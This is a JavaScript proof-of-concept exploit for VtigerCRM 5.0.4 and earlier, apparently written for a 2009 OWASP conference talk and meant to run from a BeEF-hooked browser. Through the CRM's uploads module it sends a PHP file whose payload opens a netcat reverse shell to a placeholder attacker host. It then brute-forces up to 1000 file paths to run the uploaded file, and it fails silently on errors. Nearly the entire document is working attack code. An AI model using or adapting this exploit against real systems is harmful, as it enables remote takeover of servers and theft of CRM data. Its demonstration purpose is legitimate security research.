// VtigerCRM <= 5.0.4 "chained exploitation" PoC 
// Hacked up for OWASP New Zealand Day, July 13th 2009
//
// Thanks for the BeEF Wade :) 

// http://site/vtigercrm//
baseurl = "ATTACKURL";

function do_upload(){ 
	// start AJAX file upload in 1 second
	window.setTimeout("ajax_upload()", 1000);
}

// In a nutshell: 
// 
// 1) build url 
// 2) construct the request object
// 3) POST the form 
// 4) once requestdone, call do_callfile()

function ajax_upload(){ 
	// Setup the AJAX POST  
	var targeturl = baseurl + '/index.php?module=uploads&action=add2db&return_module=Home&return_action=index';
	var binary;
	var filename;
	var mytext;

	http_request = false;
	http_request = new XMLHttpRequest();
	if (!http_request) {
		// fail silently!
		return false;
	}

	//prepare the POST 
	var boundaryString = 'PWNED';
	var boundary = '-----------------------------PWNED';
	var requestbody =
	boundary + '\\\n'
	+ 'Content-Disposition: form-data; name="MAX_FILE_SIZE"' + '\\\n' 
	+ '\\\n' 
	+ 3000000 + '\\\n'
	+ boundary
	+ '\\\n'
	+ 'Content-Disposition: form-data; name="return_module"' + '\\\n' 
	+ '\\\n'
	+ '\\\n'
	+ boundary
	+ '\\\n'
	+ 'Content-Disposition: form-data; name="return_action"' + '\\\n' 
	+ '\\\n'
	+ '\\\n'
	+ boundary
	+ '\\\n'
	+ 'Content-Disposition: form-data; name="return_id"' + '\\\n' 
	+ '\\\n'
	+ '\\\n' 
	+ boundary
	+ '\\\n'
	+ 'Content-Disposition: form-data; name="uploadsubject"' + '\\\n' 
	+ '\\\n' 
	+ '\\\n' 
	+ boundary
	+ '\\\n'
	+ 'Content-Disposition: form-data; name="filename"; filename="vtiger-fun.PHP"' + '\\\n' 
	+ 'Content-Type: application/x-httpd-php' + '\\\n' 
	+ '\\\n'
	+ '<\?php' + '\\\n' 
	+ 'passthru("/bin/nc -e /bin/sh CONNECTHOST CONNECTPORT");' + '\\\n'
	+ '\?>' + '\\\n'
	+ '\\\n'
	+ boundary
	+ '\\\n'                                   
	+ 'Content-Disposition: form-data; name="filename_hidden"' + '\\\n'
	+ '\\\n' 
	+ 'vtiger-fun.PHP'
	+ '\\\n'
	+ boundary
	+ '\\\n'
	+ 'Content-Disposition: form-data; name="txtDescription"' + '\\\n' 
	+ '\\\n' 
	+ 'drop it like its hot' + '\\\n' 
	+ boundary 
	+ '\\\n'
	+ 'Content-Disposition: form-data; name="save"' + '\\\n' 
	+ '\\\n' 
	+ 'Attach' + '\\\n' 
	+ boundary;

	http_request.onreadystatechange = requestdone;
	http_request.open('POST', targeturl, true);
	http_request.setRequestHeader("Content-type", "multipart/form-data; boundary=---------------------------PWNED");
	http_request.setRequestHeader("Content-length", requestbody.length);
	http_request.send(requestbody);
}

// ajax call done... File uploaded? :) 
function requestdone() {
	if (http_request.readyState == 4) {
		if (http_request.status == 200) {
			result = http_request.responseText;
			// find our file
			do_callfile();
		} else {
			// fail silently
			
		}
	}
}


function requestfile() {
	if (http_request.readyState == 4) {
		if (http_request.status == 200) {
			result = http_request.responseText;
		} else {
		    // fail silently
			
		}
	}
}
// find our file :)
//
// Dirty brute force 
function do_callfile(){
	var i=0;
	for (i=0;i<=1000;i++)
	{
  	     	 http_request = false;
       		 http_request = new XMLHttpRequest();
       		 if (!http_request) {
               		 // fail silently!
                	return false;
        	}

		var findurl = baseurl + "FILEPATH" + i + "_vtiger-fun.PHP";
		var requestbody = "birds of a feather flock together";
		
		http_request.onreadystatechange = requestfile;
		http_request.open('POST', findurl, true);
		http_request.setRequestHeader("Content-length", requestbody.length);
		http_request.send(requestbody);

	}
}

// Add your clean up routine here.
function do_cleanup() {
    //document.write("Maybe your security team should check out owasp.org? ;)");
}

// Try the upload 
function do_main(){
	do_upload();
}

// Run the sploit
do_main();

do_cleanup();
return_result(result_id, "RTN");
